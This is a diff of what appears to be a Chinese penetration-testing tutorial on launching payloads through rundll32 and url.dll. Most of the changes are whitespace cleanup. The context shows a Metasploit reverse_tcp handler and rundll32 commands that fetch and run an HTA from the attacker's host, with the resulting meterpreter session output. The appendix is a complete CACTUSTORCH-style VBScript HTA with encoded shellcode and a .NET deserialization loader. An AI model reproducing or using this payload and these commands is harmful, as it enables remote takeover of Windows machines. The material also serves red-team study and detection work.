@@ -24,14 +24,14 @@ C:\Windows\SysWOW64\url.dll
 
 ### 配置攻击机msf：
 ```bash
-msf exploit(multi/handler) > show options 
+msf exploit(multi/handler) > show options
 
-Module options (exploit/multi/handler): 
+Module options (exploit/multi/handler):
 
 Name Current Setting Required Description
-‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ 
+‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
 
-Payload options (windows/meterpreter/reverse_tcp): 
+Payload options (windows/meterpreter/reverse_tcp):
 
 Name Current Setting Required Description
 ‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
@@ -39,17 +39,17 @@ EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none)
 
 LHOST 192.168.1.4 yes The listen address (an interface may be specified)
 
-LPORT 53 yes The listen port 
+LPORT 53 yes The listen port
 
-Exploit target: 
+Exploit target:
 
 Id Name
 ‐‐ ‐‐‐‐
-0 Wildcard Target 
+0 Wildcard Target
 
-msf exploit(multi/handler) > exploit 
+msf exploit(multi/handler) > exploit
 
-[*] Started reverse TCP handler on 192.168.1.4:53 
+[*] Started reverse TCP handler on 192.168.1.4:53
 ```
 ![](media/34dcce4115809e6e8606cd1ef8322301.jpg)
 
@@ -60,7 +60,7 @@ rundll32.exe url.dll,FileProtocolHandler file://C:\Users\John\Desktop\Micropoor_
 ```
 
 ```bash
-msf exploit(multi/handler) > exploit 
+msf exploit(multi/handler) > exploit
 
 [*] Started reverse TCP handler on 192.168.1.4:53
 [*] Sending stage (179779 bytes) to 192.168.1.3
@@ -70,7 +70,7 @@ msf exploit(multi/handler) > exploit
 meterpreter > getuid
 Server username: John‐PC\John
 meterpreter > getpid
-Current pid: 8584 
+Current pid: 8584
 ```  
 
 ![](media/35593539e0127b86c28eef1e16e5f52b.jpg)
@@ -83,10 +83,10 @@ rundll32.exe url.dll,OpenURL http://192.168.1.4/Micropoor_url_dll.hta
 
 ### 附录：Micropoor_url_dll.hta
 
-```visual-basic
-<script language="VBScript"> 
+```visual basic
+<script language="VBScript">
 
-Dim binary : binary = "rundll32.exe" 
+Dim binary : binary = "rundll32.exe"
 
 Dim code : code = "/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMH
 PDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7
@@ -272,17 +272,17 @@ s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 s = s & "AAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVmbGVjdGlv"
 s = s & "bi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA"
-entry_class = "cactusTorch" 
+entry_class = "cactusTorch"
 
 Dim fmt, al, d, o
 Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
 Set al = CreateObject("System.Collections.ArrayList")
-al.Add fmt.SurrogateSelector 
+al.Add fmt.SurrogateSelector
 
 Set d = fmt.Deserialize_2(Base64ToStream(s))
 Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
 o.flame binary,code
-End Sub 
+End Sub
 
 SetVersion
 On Error Resume Next
@@ -290,9 +290,9 @@ Run
 If Err.Number <> 0 Then
 Debug Err.Description
 Err.Clear
-End If 
+End If
 
 self.close
-</script> 
+</script>
 ```
 >   Micropoor
